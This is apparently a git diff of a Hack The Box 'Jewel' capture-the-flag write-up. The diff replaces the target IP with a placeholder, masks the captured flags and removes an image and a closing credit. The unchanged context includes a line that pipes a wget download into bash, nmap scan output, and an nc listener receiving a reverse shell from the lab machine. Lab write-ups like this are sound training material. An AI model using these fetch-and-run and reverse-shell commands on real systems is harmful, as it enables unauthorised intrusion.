@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Jewel
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-jewel-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 TODO: finish writeup and clean up
@@ -35,11 +33,11 @@ wget -O - -q $url:$port/$file | bash
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.211`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/jewel]
-└─$ nmap -sCV -n -p- -Pn -v -oA jewel 10.10.10.211                                                130 ⨯
+└─$ nmap -sCV -n -p- -Pn -v -oA jewel <YOUR_IP>                                                130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-13 20:56 EST
 NSE: Loaded 153 scripts for scanning.
@@ -51,25 +49,25 @@ Completed NSE at 20:56, 0.00s elapsed
 Initiating NSE at 20:56
 Completed NSE at 20:56, 0.00s elapsed
 Initiating Connect Scan at 20:56
-Scanning 10.10.10.211 [65535 ports]
-Discovered open port 8080/tcp on 10.10.10.211
-Discovered open port 22/tcp on 10.10.10.211
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 8080/tcp on <YOUR_IP>
+Discovered open port 22/tcp on <YOUR_IP>
 Connect Scan Timing: About 17.74% done; ETC: 20:58 (0:02:24 remaining)
 Connect Scan Timing: About 41.92% done; ETC: 20:58 (0:01:25 remaining)
 Connect Scan Timing: About 65.74% done; ETC: 20:58 (0:00:47 remaining)
-Discovered open port 8000/tcp on 10.10.10.211
+Discovered open port 8000/tcp on <YOUR_IP>
 Completed Connect Scan at 20:58, 125.55s elapsed (65535 total ports)
 Initiating Service scan at 20:58
-Scanning 3 services on 10.10.10.211
+Scanning 3 services on <YOUR_IP>
 Completed Service scan at 20:58, 11.25s elapsed (3 services on 1 host)
-NSE: Script scanning 10.10.10.211.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 20:58
 Completed NSE at 20:58, 2.77s elapsed
 Initiating NSE at 20:58
 Completed NSE at 20:58, 0.33s elapsed
 Initiating NSE at 20:58
 Completed NSE at 20:58, 0.00s elapsed
-Nmap scan report for 10.10.10.211
+Nmap scan report for <YOUR_IP>
 Host is up (0.076s latency).
 Not shown: 65532 filtered ports
 PORT     STATE SERVICE VERSION
@@ -85,8 +83,8 @@ PORT     STATE SERVICE VERSION
 | http-open-proxy: Potentially OPEN proxy.
 |_Methods supported:CONNECTION
 |_http-server-header: Apache/2.4.38 (Debian)
-| http-title: 10.10.10.211 Git
-|_Requested resource was http://10.10.10.211:8000/gitweb/
+| http-title: <YOUR_IP> Git
+|_Requested resource was http://<YOUR_IP>:8000/gitweb/
 8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
 |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
 | http-methods: 
@@ -417,7 +415,7 @@ Script started, output log file is 'typescript'.
 └─$ bash      
 zweilos@kali:~/htb/jewel$ nc -lvnp 8099
 listening on [any] 8099 ...
-connect to [10.10.15.13] from (UNKNOWN) [10.10.10.211] 40016
+connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 40016
 bash: cannot set terminal process group (818): Inappropriate ioctl for device
 bash: no job control in this shell
 bill@jewel:~/blog$
@@ -480,7 +478,7 @@ There was a few interesting hidden files in `bill`'s home folder, including one 
 
 ```text
 bill@jewel:~$ cat user.txt 
-9688e08ab337fd2944c921e8dd4383b2
+****
 ```
 
 I was happy to see that `bill` had the `user.txt` flag in his home directory!
@@ -683,7 +681,7 @@ After setting my system to GMT I got a different sort of error. The time between
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/jewel]
-└─$ remote_time=`ssh -i jewel bill@10.10.10.211 date` && date -s $remote_time
+└─$ remote_time=`ssh -i jewel bill@<YOUR_IP> date` && date -s $remote_time
 date: invalid date ‘Mon 15 Feb 00:51:59 GMT 2021’
 ```
 
@@ -790,13 +788,9 @@ drwxr-xr-x 2 root root 4096 Aug 26 09:35 exe
 # ls
 root.txt
 # cat root.txt
-ccd692c5e666d9ed85939664d3e70448
+****
 ```
 
 After that I collected my hard-earned proof, then set my clock back to normal!
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-jewel-pwned.png)
-
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
